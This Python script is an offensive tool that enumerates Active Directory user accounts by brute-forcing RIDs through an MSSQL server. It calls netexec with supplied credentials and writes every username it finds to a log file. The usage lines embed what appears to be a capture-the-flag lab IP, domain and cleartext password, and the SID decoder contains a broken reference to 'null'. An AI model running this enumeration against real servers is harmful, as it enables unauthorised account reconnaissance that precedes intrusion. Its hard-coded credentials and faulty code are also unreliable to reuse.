import subprocess, sys, re, struct, datetime

def printHeader():
   print('''
#     _      _____ ____  _    _ 
#    / \__/|/  __//  _ \/ \  /|
#    | |\/|||  \  | / \|| |  ||
#    | |  |||  /_ | \_/|| |/\||
#    \_/  \|\____\\____/\_/  \|
#
# Me0w's Mssql RID Brute Enumeration Tool MMRBET v1.1
#''')

def getSID(host, user, pwd, domain, forceLocalAuth):
   print("[*] Probing mssql service for user " + domain + " SID.")
   command = []
   if forceLocalAuth == True:
      command = ["nxc", "mssql", host, "-u", user, "-p", pwd, "-q", "SELECT SUSER_SID('" + domain + "')", "--local-auth"]
   else:
      command = ["nxc", "mssql", host, "-u", user, "-p", pwd, "-q", "SELECT SUSER_SID('" + domain + "')"]
   result = subprocess.run(command, capture_output=True, text=True, check=True)
   output = result.stdout
   bIndex = output.find("b'")
   if bIndex == -1:
      return ""
   SID = output[bIndex+2:-2]
   return SID
   
def getSUSER(host, user, pwd, domain, SID):
   print("[*] Retrieving user name for SID : " + SID)
   command = ["nxc", "mssql", host, "-u", user, "-p", pwd, "-q", "SELECT SUSER_SNAME(0x" + SID + ")"]
   result = subprocess.run(command, capture_output=True, text=True, check=True)
   output = result.stdout
   if "NULL" not in output:
      username = output.split("\n")[2].split(" ")
      username = username[len(username) - 1]
      return username
   return ""

def extractSIDPrefix(SID):
   return SID[:-8]
   
def extractRIDRaw(SID):
   rawRID = SID[-8:]
   return rawRID   
   
def extractRIDAsDecimal(SID):
   rawRID = extractRIDRaw(SID)
   return littleEndianHexToDec(rawRID)
   
def littleEndianHexToDec(leHex):
   return int.from_bytes(bytes.fromhex(leHex), 'little')
   
def decToLittleEndianHex(n):
   return struct.pack('<I', n).hex()  
   
def decodeLittleEndianHexSID(SID):
    SIDBytes = bytes.fromhex(SID)
    revision, subAuthCount = struct.unpack_from('<BB', SIDBytes)
    identifierAuthorityBytes = SIDBytes[2:7]  # Get 6 bytes starting from byte 2
    identifier = int.from_bytes(identifierAuthorityBytes, byteorder='big')
    subAuthorities = ""
    offset = 8 
    for _ in range(subAuthCount):
        subAuth = struct.unpack_from('<I', SIDBytes, offset)[0]
        subAuthorities += str(subAuth) + "-"
        offset += 4  
    result = f""
    if identifier == 0 or identifier is null:
       result = f"S-{revision}-{subAuthCount}-{subAuthorities}"[:-1]
    else:
       result = f"S-{revision}-{subAuthCount}-{identifier}-{subAuthorities}"[:-1]
    return result
  
def enum(host, user, pwd, domain, iterations, forceLocalAuth):
   SID = getSID(host, user, pwd, domain, forceLocalAuth)
   if SID == "":
      print("[!] Error, unable to retrieve SID for user " + user)
      sys.exit(1)
   print("[*] SID for user " + domain + " successfully retrieved : " + SID)
   RID = extractRIDAsDecimal(SID)
   SIDPrefix = extractSIDPrefix(SID)
   maxRID = RID + iterations
   with open("MMRBET_1.1.txt", 'a') as outfile:
      while RID <= maxRID:
         print("[*] Iterating from current RID : " + str(RID) + " to " + str(RID + iterations))
         leHexRID = decToLittleEndianHex(RID)
         currentSID = SIDPrefix + leHexRID
         username = getSUSER(host, user, pwd, domain, currentSID)
         if username != "":
            print("   [****] Username found : " + username)
            humanReadableSID = decodeLittleEndianHexSID(currentSID)
            outfile.write("[" + str(datetime.datetime.now()) + "]" + username + "; SID : " + currentSID + " = " + humanReadableSID + "\n")
         RID += 1
      
def main():
   printHeader()
   try:
      host = str(sys.argv[1])          # host ip
      user = str(sys.argv[2])          # mssql username
      pwd = str(sys.argv[3])           # mssql user password
      domain = str(sys.argv[4])        # Ex : SIGNED\mssqlsvc used to infer the SID and start range for RIDS
      iterations = int(sys.argv[5])    # max iterations for RID increment
      forceLocalAuth = False           # use netexec --local-auth argument
      if(len(sys.argv) > 6):
         forceLocalAuth = sys.argv[6]    
         if sys.argv[6] == "1":
            forceLocalAuth = True
            print("> local-auth enabled")
      else:
         forceLocalAuth = False
         print("> local-auth disabled")
      try:  
         enum(host, user, pwd, domain, iterations, forceLocalAuth)
      except Exception as e:
         print(e)
      sys.exit(0)
   except Exception as e:
      print("Usage : python3 rid-brute.py IP_ADDRESS MSSQL_USERNAME MSSQL_PASSWORD DOMAIN_USER ITERATION_COUNT ENABLE_LOCAL_AUTH(default 0, no)")
      print("Example : python3 rid-enhanced.py 10.10.11.90 SIGNED\\mssqlsvc 'purPLE9795!@' SIGNED\\mssqlsvc 1000")
      print("Example with local-auth : python3 rid-enhanced.py 10.10.11.90 SIGNED\\mssqlsvc 'purPLE9795!@' SIGNED\\mssqlsvc 1000 1")
      sys.exit(1)
   
if __name__=='__main__':
   main()